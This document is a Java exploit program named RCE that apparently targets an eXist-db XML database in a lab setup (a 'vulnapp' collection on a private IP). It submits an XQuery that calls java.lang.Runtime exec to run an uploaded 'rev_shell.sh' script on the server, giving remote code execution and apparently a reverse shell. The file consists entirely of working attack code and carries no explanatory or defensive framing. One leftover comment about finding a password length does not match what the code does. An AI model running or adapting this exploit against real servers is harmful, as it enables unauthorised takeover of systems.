import org.xmldb.api.DatabaseManager;
import org.xmldb.api.base.*;
import org.xmldb.api.modules.XPathQueryService;

public class RCE {
    protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
    protected static String URI = "xmldb:exist://192.168.10.130:8080/exist/xmlrpc";
    protected static String collectionPath = "/db/vulnapp/";
    protected static String resourceName = "user.xml";
    public static Collection col = null;

    public static void main(String[] args) throws Exception {
        Class cl = Class.forName(DRIVER);
        Database database = (Database) cl.newInstance();
        DatabaseManager.registerDatabase(database);

        // get the collection
        col = DatabaseManager.getCollection(URI + collectionPath);
        try {
            exploit();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void  exploit() throws Exception{
        String exploit_query = "declare namespace runtime =\"java:java.lang.Runtime\"; declare variable $rt:= runtime:get-runtime(); runtime:exec($rt, \"/bin/bash /usr/local/eXist-db/webapp/WEB-INF/data/fs/db/vulnapp/rev_shell.sh\")";
        //Finding the password length
        System.out.println(query(exploit_query));
    }

    public static String query (String query) throws Exception{

        // query a document
        System.out.println("Execute xQuery = " + query);

        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
        xpqs.setProperty("indent", "yes");


        // Execute the query, print the result
        ResourceSet result = xpqs.query(query);
        ResourceIterator i = result.getIterator();
        StringBuffer bf = new StringBuffer();
        while (i.hasMoreResources()) {
           Resource r = i.nextResource();
            bf.append((String) r.getContent());
        }
        return bf.toString();
    }
}
